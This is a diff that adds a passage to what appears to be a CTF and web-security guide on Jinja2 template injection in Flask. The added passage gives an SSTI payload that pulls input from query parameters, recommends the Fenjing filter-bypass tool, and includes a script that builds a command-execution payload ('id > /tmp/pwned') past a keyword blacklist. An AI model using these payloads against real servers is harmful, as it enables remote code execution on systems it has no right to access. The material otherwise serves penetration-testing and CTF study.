@@ -66,6 +66,42 @@ Writeup of challenge where quotes (`'` & `"`) were blocked
 ```
 {% endcode %}
 
+In Flask, it is also possible to read strings from query parameters. The following does not use many special characters while allowing you to put any special characters that you need in a `?a=` query parameter for the request triggering `render_template` or `render_template_string`:
+
+```python
+{{request|attr("args")|attr("get")("a")}}
+```
+
+When these don't cut it, try this phenomenal tool built specifically to bypass Jinja2 template injection filters. Given a server, it automatically detects the filter remotely to try and bypass it. This combines many tricks to bypass all kinds of character/word filters:
+
+{% embed url="https://github.com/Marven11/Fenjing" %}
+Automatic ()
+{% endembed %}
+
+You should read the documentation of the tool above ([English translation](https://github-com.translate.goog/Marven11/Fenjing?\_x\_tr\_sl=zh-CN&\_x\_tr\_tl=en&\_x\_tr\_pto=wapp)) to understand its usage. One of its most useful features is shown in the [examples](https://github-com.translate.goog/Marven11/Fenjing/blob/main/examples.md?\_x\_tr\_sl=zh-CN&\_x\_tr\_tl=en&\_x\_tr\_pto=wapp) when you can recreate the source code of the filter you are up against. Passing a function that returns `True` for valid requests and `False` for blocked ones, it can locally prepare a bypass for you to send in one shot:
+
+<pre class="language-python"><code class="lang-python">from fenjing import exec_cmd_payload, config_payload
+import logging
+logging.basicConfig(level=logging.INFO)
+
+<strong>COMMAND = "id > /tmp/pwned"
+</strong>
+def waf(s: str):
+    blacklist = [
+<strong>        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
+</strong><strong>        "[", '"', "'", "_", ".", "+", "~", "{{",
+</strong><strong>        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
+</strong><strong>        "０", "１", "２", "３", "４", "５", "６", "７", "８", "９"
+</strong>    ]
+    return all(word not in s for word in blacklist)
+
+if __name__ == "__main__":
+<strong>    payload, _ = exec_cmd_payload(waf, COMMAND)  # shell command
+</strong>    # payload = config_payload(waf)  # read '{{ config }}'
+
+    print(payload)  # '{%set de=dict(GET=x)|first|lower%}{%set ...'
+</code></pre>
+
 ## Werkzeug - Debug Mode RCE (Console PIN)
 
 Werkzeug is a very popular HTTP back-end for Python. Libraries like Flask use this in the back, and you might see "werkzeug" related response headers indicating this. It has a **Debug Mode** that will show some code context and stack traces when a server-side error occurs. These lines can expand to a few more lines to leak some source code, but the real power comes from the **Console**.&#x20;
